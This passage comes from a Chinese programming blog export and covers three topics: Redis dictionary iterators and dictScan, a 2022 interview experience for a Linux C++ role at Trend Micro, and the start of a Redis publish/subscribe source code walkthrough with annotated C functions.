<h5><span id="2-迭代器初始化">2、迭代器初始化</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dictIterator *<span class="title function_">dictGetIterator</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    dictIterator *iter = zmalloc(<span class="keyword">sizeof</span>(*iter));</span><br><span class="line">    iter-&gt;d = d;</span><br><span class="line">    iter-&gt;table = <span class="number">0</span>;</span><br><span class="line">    iter-&gt;index = <span class="number">-1</span>;</span><br><span class="line">    iter-&gt;safe = <span class="number">0</span>;</span><br><span class="line">    iter-&gt;entry = <span class="literal">NULL</span>;</span><br><span class="line">    iter-&gt;nextEntry = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> iter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dictIterator *<span class="title function_">dictGetSafeIterator</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    dictIterator *i = dictGetIterator(d);</span><br><span class="line"></span><br><span class="line">    i-&gt;safe = <span class="number">1</span>;	<span class="comment">// 安全迭代器和非安全迭代器初始化的区别就是safe成员不同而已！</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，安全迭代器和非安全迭代器初始化的区别就是safe成员不同而已。</p>
<h5><span id="3-遍历下一个节点">3、遍历下一个节点</span></h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dictEntry *<span class="title function_">dictNext</span><span class="params">(dictIterator *iter)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;entry == <span class="literal">NULL</span>) &#123;		<span class="comment">// 如果为空，遍历下一个索引</span></span><br><span class="line">            dictht *ht = &amp;iter-&gt;d-&gt;ht[iter-&gt;table];</span><br><span class="line">            <span class="keyword">if</span> (iter-&gt;index == <span class="number">-1</span> &amp;&amp; iter-&gt;table == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (iter-&gt;safe)</span><br><span class="line">                    iter-&gt;d-&gt;iterators++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    iter-&gt;fingerprint = dictFingerprint(iter-&gt;d);	<span class="comment">// 如果是非安全迭代器，计算指纹</span></span><br><span class="line">            &#125;</span><br><span class="line">            iter-&gt;index++;</span><br><span class="line">            <span class="keyword">if</span> (iter-&gt;index &gt;= (<span class="type">long</span>) ht-&gt;size) &#123;	<span class="comment">// 如果当前哈希表是ht[0]且遍历完成，尝试遍历ht[1]</span></span><br><span class="line">                <span class="keyword">if</span> (dictIsRehashing(iter-&gt;d) &amp;&amp; iter-&gt;table == <span class="number">0</span>) &#123;</span><br><span class="line">                    iter-&gt;table++;</span><br><span class="line">                    iter-&gt;index = <span class="number">0</span>;</span><br><span class="line">                    ht = &amp;iter-&gt;d-&gt;ht[<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            iter-&gt;entry = ht-&gt;table[iter-&gt;index];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 否则，遍历当前链表的下一个元素</span></span><br><span class="line">            iter-&gt;entry = iter-&gt;nextEntry;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;entry) &#123;</span><br><span class="line">            <span class="comment">/* We need to save the &#x27;next&#x27; here, the iterator user</span></span><br><span class="line"><span class="comment">             * may delete the entry we are returning. */</span></span><br><span class="line">            iter-&gt;nextEntry = iter-&gt;entry-&gt;next;</span><br><span class="line">            <span class="keyword">return</span> iter-&gt;entry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简要概括，这个遍历操作就是从ht[0]到ht[1]，再沿着哈希表数组往下遍历。</p>
<h4><span id="dictscan算法">dictScan算法<span id="jump23"></span></span></h4><p>dictScan算法用于遍历字典，是Redis字典源码中最为精妙，同时也是最难理解的算法。</p>
<p><strong>字典遍历算法的复杂性分析</strong></p>
<p>Redis字典涉及Rehash操作，如果在两次遍历键之间，字典发生了扩展或收缩，就会导致哈希键的索引值变化。字典遍历算法实现的难点在于<font color="red"><strong>如何保证字典中原有元素都能被遍历到，且迭代到的重复元素尽可能地少</strong></font></p>
<p>Redis实现的dictScan算法特点如下：</p>
<ul>
<li><p>开始遍历时的所有元素，只要不被删除都能被返回</p>
</li>
<li><p>rehash过程中，算法可能返回重复元素，遍历过程中新增或删除的key可能返回，可能不返回。</p>
</li>
</ul>
<p><strong>具体实现分析：</strong></p>
<p>先挖个坑，后续再填。。。。。。</p>
<p>网上已有非常深入的分析，推荐这篇：<a href="https://tech.meituan.com/2018/07/27/redis-rehash-practice-optimization.html">美团针对Redis Rehash机制的探索和实践</a></p>
<h2><span id="参考资料">参考资料</span></h2><p>【1】《Redis设计与实现》 第4章 字典</p>
<p>【2】<a href="https://juejin.cn/post/6844903702373859335">Copy On Write机制了解一下</a></p>
<p>【3】<a href="https://tech.meituan.com/2018/07/27/redis-rehash-practice-optimization.html">美团针对Redis Rehash机制的探索和实践</a></p>
<p>【4】<a href="https://cloud.tencent.com/developer/article/1672781">解决哈希冲突的常用方法分析</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 Trend Micro 社招面经</title>
    <url>/2022/0320205239.html</url>
    <content><![CDATA[<h2><span id="个人信息">个人信息</span></h2><ul>
<li>985&#x2F;211本科，2年Linux C&#x2F;C++经验</li>
<li>2022-02-25 官网投递简历，职位：Linux开发</li>
</ul>
<h2><span id="面试流程">面试流程</span></h2><span id="more"></span>

<h3><span id="机试">机试</span></h3><p>时间：2022-02-27 19:00:00</p>
<p>两道编程题，要求1小时内完成，机试用的是牛客网链接，没有自动补全。题目如下，非常简单：</p>
<ul>
<li><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">LeetCode 121 买卖股票的最佳时机</a> —— 双指针</p>
</li>
<li><p><a href="https://leetcode-cn.com/problems/number-of-islands/">LeetCode 200 岛屿数量</a> —— DFS、BFS</p>
</li>
</ul>
<h3><span id="技术一面">技术一面</span></h3><p>时间：2022-03-03 12:00:00</p>
<p>线上面试，用的微软Teams，二对一，80min</p>
<ul>
<li><p>中文自我介绍</p>
</li>
<li><p>问项目（30min）</p>
<ul>
<li>简单介绍项目（项目名称、背景、目标客户、完成基本事情、做了多久、项目规模、用到技术点）</li>
<li>问实现细节（背景、难点、如何解决、成果、为什么用这个方案、优化点）</li>
<li>举一个项目中你遇到的难题，如何解决的</li>
<li>你的项目中为什么用Redis，不用MySQL</li>
<li>……</li>
</ul>
</li>
<li><p>1道编程题 （15min）</p>
<ul>
<li>编写程序，生成长度为N的随机字符串，求最长的合法字母子串</li>
</ul>
</li>
<li><p>技术问题（25min）</p>
<ul>
<li>给每个中国人分一个IP地址，够分吗</li>
<li>TCP相比UDP来说是可靠的，这种说法对吗</li>
<li>后台服务变慢，谈谈你的定位思路</li>
<li>Linux进程内存布局（Text, Data, BSS, Stack, Heap …）</li>
<li>Redis过期键的实现原理，过期时间怎么存储的</li>
<li>Redis缓存逐出策略</li>
<li>全中国人的数据能放到一张MySQL表里吗</li>
<li>MySQL中，人名用什么类型存储，住址用什么类型存储</li>
<li>Linux下如何定时备份一个文件</li>
</ul>
</li>
<li><p>其它问题（10min）</p>
<ul>
<li>同事对你的评价</li>
<li>你的缺点是什么</li>
<li>同事觉得你有什么阴暗面</li>
<li>你还有什么要问的？（问前期负责哪些工作内容）</li>
</ul>
</li>
</ul>
<h3><span id="技术二面">技术二面</span></h3><p>时间：2022-03-04 12:15:00</p>
<p>现场面试，二对一，50min</p>
<ul>
<li><p>中文自我介绍</p>
</li>
<li><p>简单问项目（10min）</p>
</li>
<li><p>什么是僵尸进程，什么条件会出现？（没答好，把僵尸进程和孤儿进程混为一谈了~）</p>
</li>
<li><p>你在项目组里还负责了哪些项目和工作</p>
</li>
<li><p>你为什么说离职是因为学不到新技术呢（挖离职原因）</p>
</li>
<li><p>你平时用到的开发工具和编程语言</p>
</li>
<li><p>说下你的团队成员组成</p>
</li>
<li><p>说说你最近在看的书</p>
</li>
<li><p>你的机试两题都做对了，平时是经常刷题吗？来简单做1道题吧 （15min，没做出来…）</p>
<ul>
<li><a href="https://leetcode-cn.com/problems/pile-box-lcci/">Hard 堆箱子</a>   —— 动态规划、最长上升子序列</li>
</ul>
</li>
<li><p>项目中遇到别人不配合你的工作怎么办</p>
</li>
<li><p>你在项目中怎么合作的，怎么跨部门合作的</p>
</li>
<li><p>评价你同事的水平</p>
</li>
<li><p>有没有感觉有技术能力比较弱的同事</p>
</li>
<li><p>你还有什么问题（问团队成员组成）</p>
</li>
</ul>
<h3><span id="hr面">HR面</span></h3><p>时间：2022-03-04 13:30:00</p>
<p>现场面试，一对一，30min</p>
<ul>
<li><p>自我介绍</p>
</li>
<li><p>为什么选择我们公司，选择这个职位</p>
</li>
<li><p>你为什么离职</p>
</li>
<li><p>你当初考虑XX公司的原因是什么</p>
</li>
<li><p>你有考虑过内部转岗吗</p>
</li>
<li><p>你的期望薪酬（问薪酬结构，福利待遇）</p>
</li>
<li><p>你同事对你的评价</p>
</li>
<li><p>说说你的优点</p>
</li>
<li><p>你还有什么问题？（问晋升机制，职位空缺原因）</p>
</li>
</ul>
<h2><span id="面试感受">面试感受</span></h2><p>趋势的面试效率很高，从投递简历到拿到offer在2周内完成</p>
<p>全程接触的面试官、HR都很nice，整个过程是一个平等的对话交流，体验很好</p>
<h2><span id="总结和反思">总结和反思</span></h2><ul>
<li>永远不要等自己觉得完全准备好了再投递简历。本身面试运气成分就很大，而且机会稍纵即逝，等你觉得完全准备好了，可能岗位都已经没HC了</li>
<li>遇到不会的技术问题不要不懂装懂，可以说自己的项目没涉及这方面。因为面试官看你一知半解就会把你问到不会为止~</li>
<li>对算法题的重视程度不够（一道常见DP都没做出来~）。如果是短期准备面试，刷题方法可参考：<a href="https://zhuanlan.zhihu.com/p/349940945">Leetcode面试高频题分类刷题总结</a></li>
<li>八股文没怎么准备。背八股文就像考前突击应试，虽然大家都很讨厌做这个事，但不得不承认它的确对面试有帮助。。。</li>
</ul>
<h2><span id="参考资料">参考资料</span></h2><p>以下是准备面试过程中的一些参考资料：</p>
<p>【1】<a href="https://zhuanlan.zhihu.com/p/349940945">Leetcode面试高频题分类刷题总结</a></p>
<p>【2】<a href="https://github.com/huihut/interview">C&#x2F;C++ 技术面试（八股文）</a></p>
<p>【3】<a href="https://github.com/0voice/interview_internal_reference">2021年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目，以及答案</a></p>
<p>【3】<a href="https://cloud.tencent.com/developer/article/1785952">10 个 GitHub 上最火的程序员简历项目</a></p>
<p>【4】<a href="https://blog.csdn.net/icecoola_/article/details/78677435">程序员自我介绍</a></p>
<p>【5】<a href="https://yongluo2013.github.io/questions-for-english-interview/">外企面试最常见的36个英文问题</a></p>
<p>【6】<a href="https://www.zhihu.com/question/60591411">面试时问到我的项目经历，是在问我什么呢？</a></p>
<p>【7】<a href="https://zhuanlan.zhihu.com/p/87908851">HR面试70问</a></p>
<p>【8】<a href="https://github.com/formulahendry/955.WLB">955.WLB</a></p>
]]></content>
      <categories>
        <category>interview</category>
      </categories>
      <tags>
        <tag>interview</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis发布与订阅源码分析</title>
    <url>/2022/0129204852.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>通过阅读Redis源码，配合GDB和抓包等调试手段，分析Redis发布订阅的实现原理，思考相关问题。</p>
<p><strong>源码版本：</strong><a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<h2><span id="思考问题">思考问题</span></h2><ul>
<li><a href="#jump0">发布订阅基本概念介绍</a></li>
<li><a href="#jump1">订阅频道 —— SUBSCRIBE命令的实现</a></li>
<li><a href="#jump2">退订频道 —— USUBSCRIBE命令的实现</a></li>
<li><a href="#jump3">订阅模式 —— PSUBSCRIBE命令的实现</a></li>
<li><a href="#jump4">退订模式 —— PUNSUBSCRIBE命令的实现</a></li>
<li><a href="#jump5">发送消息 —— PUBLISH命令的实现</a><ul>
<li><a href="#jump6">Redis发布订阅的特点</a></li>
<li><a href="#jump7">为什么设计pubsub_patterns_dict字典？</a></li>
</ul>
</li>
<li><a href="#jump10">一次完整的Redis订阅、发布流程分析</a><ul>
<li><a href="#jump11">为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？</a></li>
<li><a href="#jump12">TCP是没有消息边界的，订阅者是如何保证正确解析发布者的消息?</a></li>
<li><a href="#jump8">订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？</a></li>
<li><a href="#jump9">服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？</a></li>
</ul>
</li>
<li>查看订阅消息</li>
</ul>
<span id="more"></span>

<h3><span id="发布订阅基本概念介绍">发布订阅基本概念介绍<span id="jump0"></span></span></h3><p>Redis的发布订阅功能由SUBSCRIBE，PSUBSCRIBE，PUBLISH等命令组成，每个命令对应的功能和相关源码参考下表：</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
<th align="left">相关源码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">subscribe</td>
<td align="left">订阅一个或多个频道</td>
<td align="left">subscribeCommand</td>
</tr>
<tr>
<td align="left">unsubscribe</td>
<td align="left">解除一个或多个频道的订阅</td>
<td align="left">unsubscribeCommand</td>
</tr>
<tr>
<td align="left">psubscribe</td>
<td align="left">订阅一个或多个模式</td>
<td align="left">psubscribeCommand</td>
</tr>
<tr>
<td align="left">punsubscribe</td>
<td align="left">解除一个或多个模式的订阅</td>
<td align="left">punsubscribeCommand</td>
</tr>
<tr>
<td align="left">publish</td>
<td align="left">发送信息到指定频道</td>
<td align="left">pubsubCommand</td>
</tr>
<tr>
<td align="left">pubsub</td>
<td align="left">查看订阅信息</td>
<td align="left">pubsubCommand</td>
</tr>
</tbody></table>
<p>Redis发布订阅的示例可参考<a href="https://www.runoob.com/redis/redis-pub-sub.html">菜鸟教程 Redis 发布订阅</a></p>
<h3><span id="订阅频道-subscribe命令的实现">订阅频道 —— SUBSCRIBE命令的实现<span id="jump1"></span></span></h3><p>客户端向Redis服务器发送SUBSCRIBE命令，Redis服务器收到客户端的订阅请求，将频道的订阅关系保存在字典<code>pubsub_channels</code>中，数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> <span class="title">server</span>;</span>	<span class="comment">/* Server global state, server.c */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span> <span class="comment">// server.h</span></span><br><span class="line">	dict *pubsub_channels;  <span class="comment">/* Map channels to list of subscribed clients */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>pubsub_channels</code>字典的键表示频道，为字符串类型，字典的值为一个链表，保存所有订阅了这个频道的客户端。</p>
<p>每当一个客户端执行<code>SUBSCRIBE channel</code>命令后，服务端将执行如下操作：</p>
<ul>
<li>如果<code>pubsub_channel</code>字典不包含<code>channel</code>这个键，说明<font color="blue">此时这个频道还没有任何订阅者</font>，此时服务端将首先在字典中创建一个叫<code>channel</code>的键，值初始成一个空链表，然后将这个客户端加入空链表。</li>
<li>如果<code>pubsub_channel</code>字典包含<code>channel</code>这个键，说明<font color="blue">此时这个频道已经有1个或多个订阅者</font>，此时服务端在字典中找到这个键对应的链表，再将这个客户端加入链表末尾。</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中client1, client2订阅<code>channel1</code>, client3, client4订阅<code>channel2</code>，此时，<code>pubsub_channels</code>字典可以是下图所示：<br><img data-src="/2022/0129204852/image1.png"></p>
<h5><span id="gdb打印频道字典pubsub_channels的方法"></span></h5><p>订阅频道的源码实现参考<code>pubsub.c/subscribeCommand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">subscribeCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++)</span><br><span class="line">        pubsubSubscribeChannel(c,c-&gt;argv[j]);</span><br><span class="line">    c-&gt;flags |= CLIENT_PUBSUB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Subscribe a client to a channel. Returns 1 if the operation succeeded, or</span></span><br><span class="line"><span class="comment"> * 0 if the client was already subscribed to that channel. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubSubscribeChannel</span><span class="params">(client *c, robj *channel)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictAdd(c-&gt;pubsub_channels,channel,<span class="literal">NULL</span>) == DICT_OK) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        incrRefCount(channel);</span><br><span class="line">        <span class="comment">/* Add the client to the channel -&gt; list of clients hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_channels,channel);</span><br><span class="line">        <span class="keyword">if</span> (de == <span class="literal">NULL</span>) &#123; <span class="comment">// 说明channel还没有任何订阅者，需先在字典中新增channel键，再初始化1个链表，并将客户端加入链表</span></span><br><span class="line">            clients = listCreate();</span><br><span class="line">            dictAdd(server.pubsub_channels,channel,clients);</span><br><span class="line">            incrRefCount(channel);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 说明channel已有1个或多个订阅者，直接将这个客户端加入链表即可</span></span><br><span class="line">            clients = dictGetVal(de);</span><br><span class="line">        &#125;</span><br><span class="line">        listAddNodeTail(clients,c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    addReplyPubsubSubscribed(c,channel);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="退订频道-usubscribe命令的实现">退订频道 —— USUBSCRIBE命令的实现<span id="jump2"></span></span></h3><p>Redis服务器收到客户端的退订频道请求后，通过修改字典<code>pubsub_channels</code>，解除客户端与频道之间的订阅关系，具体操作如下：</p>
<ul>
<li>如果<code>pubsub_channel</code>字典包含<code>channel</code>这个键，说明<font color="blue">此时这个频道已经有1个或多个订阅者</font>：<ul>
<li>如果频道有多于1个的订阅者，Redis服务器会查询<code>pubsub_channels</code>字典，找到频道对应的客户端链表，然后从链表中删除这个客户端。</li>
<li>如果频道只有1个订阅者，Redis服务器将对应的客户端链表变成空链表，并且从<code>pubsub_channels</code>字典中删除这个频道对应的键。</li>
</ul>
</li>
<li>如果<code>pubsub_channel</code>字典不包含<code>channel</code>这个键，说明没有客户端订阅这个频道，此时Redis服务器不对<code>pubsub_channels</code>字典做任何修改，只是简单向客户端发送回复。（回复内容包括三部分：”unsubscribe”, “channel”, 这个客户端订阅的频道个数和模式个数之和）</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中client1, client2订阅<code>channel1</code>, client3, client4订阅<code>channel2</code>。</p>
<p>假设client2执行<code>unsubscribe channel1</code>，client3, client4分别执行<code>unsubscribe channel2</code>，那么退订前后的<code>pubsub_channels</code>字典变化如下所示：<br><img data-src="/2022/0129204852/image2.png"></p>
<p>退订频道的源码实现参考<code>pubsub.c/unsubscribeCommand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unsubscribeCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;argc == <span class="number">1</span>) &#123;</span><br><span class="line">        pubsubUnsubscribeAllChannels(c,<span class="number">1</span>);				<span class="comment">// unsubscribe不加任何参数，表示解除所有频道的订阅</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++)</span><br><span class="line">            pubsubUnsubscribeChannel(c,c-&gt;argv[j],<span class="number">1</span>);	<span class="comment">// 解除这个客户端与某个频道的订阅关系</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientSubscriptionsCount(c) == <span class="number">0</span>) c-&gt;flags &amp;= ~CLIENT_PUBSUB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unsubscribe a client from a channel. Returns 1 if the operation succeeded, or</span></span><br><span class="line"><span class="comment"> * 0 if the client was not subscribed to the specified channel. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubUnsubscribeChannel</span><span class="params">(client *c, robj *channel, <span class="type">int</span> notify)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients;</span><br><span class="line">    listNode *ln;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Remove the channel from the client -&gt; channels hash table */</span></span><br><span class="line">    incrRefCount(channel);</span><br><span class="line">    <span class="keyword">if</span> (dictDelete(c-&gt;pubsub_channels,channel) == DICT_OK) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/* Remove the client from the channel -&gt; clients list hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_channels,channel);</span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,de != <span class="literal">NULL</span>);</span><br><span class="line">        clients = dictGetVal(de);					<span class="comment">// 1、查询pubsub_channels字典，找到频道对应的客户端链表clients</span></span><br><span class="line">        ln = listSearchKey(clients,c);				<span class="comment">// 2、在链表clients中查找客户端c</span></span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,ln != <span class="literal">NULL</span>);</span><br><span class="line">        listDelNode(clients,ln);					<span class="comment">// 3、然后从链表中删除这个客户端c</span></span><br><span class="line">        <span class="keyword">if</span> (listLength(clients) == <span class="number">0</span>) &#123;				<span class="comment">// 4、如果频道只有1个订阅者，还需要从pubsub_channels字典中删除这个频道对应的键</span></span><br><span class="line">            dictDelete(server.pubsub_channels,channel);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    <span class="keyword">if</span> (notify) addReplyPubsubUnsubscribed(c,channel);</span><br><span class="line">    decrRefCount(channel); <span class="comment">/* it is finally safe to release it */</span></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="订阅模式-psubscribe命令的实现">订阅模式 —— PSUBSCRIBE命令的实现<span id="jump3"></span></span></h3><p>Redis服务器将所有模式订阅信息记录在链表<code>pubsub_patterns</code>和字典<code>pubsub_pattern_dict</code>，相关数据结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> <span class="title">server</span>;</span>	<span class="comment">/* Server global state, server.c */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">    <span class="built_in">list</span> *pubsub_patterns;  <span class="comment">/* A list of pubsub_patterns */</span></span><br><span class="line">    dict *pubsub_patterns_dict;  <span class="comment">/* A dict of pubsub_patterns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>1、<code>pubsub_patterns</code>链表节点的类型为<code>struct pubsubPattern</code>，其中<code>pattern</code>成员表示订阅的模式串，<code>client</code>成员记录订阅该模式的客户端。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pubsubPattern</span> &#123;</span></span><br><span class="line">    client *client;			<span class="comment">// 记录订阅该模式的客户端</span></span><br><span class="line">    robj *pattern;			<span class="comment">// 表示订阅的模式串</span></span><br><span class="line">&#125; pubsubPattern;</span><br></pre></td></tr></table></figure>

<p>2、<code>pubsub_patterns_dict</code>字典的键为被订阅的模式（<code>robj *</code>类型），字典的值为链表，这个链表记录所有订阅了这个模式的客户端 。</p>
<p>当客户端执行PSUBSCRIBE命令后，Redis服务器会收到这个模式订阅请求，并执行如下操作：</p>
<ul>
<li>创建一个<code>struct pubsubPattern</code>结构，其中<code>pattern</code>成员设置为被订阅的模式，<code>client</code>成员设置为订阅该模式的客户端</li>
<li>将<code>struct pubsubPattern</code>结构加入到<code>pubsub_patterns</code>链表的末尾。</li>
<li>然后在<code>pubsub_patterns_dict</code>字典中查找这个模式：<ul>
<li>如果没查到，说明这个模式还没有任何客户端订阅。此时Redis在<code>pubsub_patterns_dict</code>字典中为这个模式创建一个键，将这个键的值设为空链表，再将客户端加入链表。</li>
<li>如果能查到，说明这个模式已有客户端订阅，<code>pubsub_patterns_dict</code>字典中必有对应的客户端链表，此时Redis只需将客户端添加到这个客户端链表的末尾即可。</li>
</ul>
</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中：</p>
<ul>
<li>client1订阅模式pat1*</li>
<li>client2订阅模式pat2*</li>
<li>client3, client4订阅模式pat3*。</li>
</ul>
<p>此时<code>pubsub_patterns_dict</code>字典和<code>pubsub_patterns</code>链表如下图所示：</p>
<p><img data-src="/2022/0129204852/image3.png"></p>
<h5><span id="gdb打印模式字典和模式链表的方法"></span></h5><p>订阅模式的源码参考<code>pubsub.c/pubsubSubscribePattern</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Subscribe a client to a pattern. Returns 1 if the operation succeeded, or 0 if the client was already subscribed to that pattern. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubSubscribePattern</span><span class="params">(client *c, robj *pattern)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listSearchKey(c-&gt;pubsub_patterns,pattern) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        pubsubPattern *pat;</span><br><span class="line">        listAddNodeTail(c-&gt;pubsub_patterns,pattern);</span><br><span class="line">        incrRefCount(pattern);</span><br><span class="line">        pat = zmalloc(<span class="keyword">sizeof</span>(*pat));					<span class="comment">// 1、构造一个pubsubPattern结构</span></span><br><span class="line">        pat-&gt;pattern = getDecodedObject(pattern);		<span class="comment">// 2、pattern成员设置为被订阅的模式</span></span><br><span class="line">        pat-&gt;client = c;								<span class="comment">// 3、client成员设置为订阅这个模式的客户端</span></span><br><span class="line">        listAddNodeTail(server.pubsub_patterns,pat);	<span class="comment">// 4、添加这个pubsubPatern结构到pubsub_patterns链表尾</span></span><br><span class="line">        <span class="comment">/* Add the client to the pattern -&gt; list of clients hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_patterns_dict,pattern);</span><br><span class="line">        <span class="keyword">if</span> (de == <span class="literal">NULL</span>) &#123;	<span class="comment">// 如果没查到，说明这个模式还没有客户端订阅，此时先在字典中为这个模式创建一个键，键的值为空链表</span></span><br><span class="line">            clients = listCreate();</span><br><span class="line">            dictAdd(server.pubsub_patterns_dict,pattern,clients);</span><br><span class="line">            incrRefCount(pattern);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clients = dictGetVal(de);</span><br><span class="line">        &#125;</span><br><span class="line">        listAddNodeTail(clients,c);	<span class="comment">// 将客户端c加入链表clients</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    addReplyPubsubPatSubscribed(c,pattern);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="退订模式-punsubscribe命令的实现">退订模式 —— PUNSUBSCRIBE命令的实现<span id="jump4"></span></span></h3><p>模式退订操作和模式订阅的操作正好相反，当客户端执行PUNSUBSCRIBE命令退订一个模式时，Redis服务器将发生如下操作：</p>
<ul>
<li>在<code>pubsub_patterns</code>链表中查找这个客户端并删除。</li>
<li>在<code>pubsub_patterns_dict</code>字典中，找到这个模式对应的客户端链表，在链表中查找这个客户端并删除。</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中：</p>
<ul>
<li>client1订阅了模式pat1*</li>
<li>client2订阅了模式pat2*</li>
<li>client3, client4订阅了模式pat3*。</li>
</ul>
<p>假设此时client2执行<code>unpsubscribe pat2*</code>，client4执行<code>unsubscribe pat3*</code>，那么模式退订前后的<code>pubsub_patterns</code>链表和<code>pubsub_patterns_dict</code>字典变化如下图所示：<br>[O<br><img data-src="/2022/0129204852/image4.png"></p>
<p>模式退订的源码参考<code>pubsub.c/punsubscribeCommand</code>：</p>
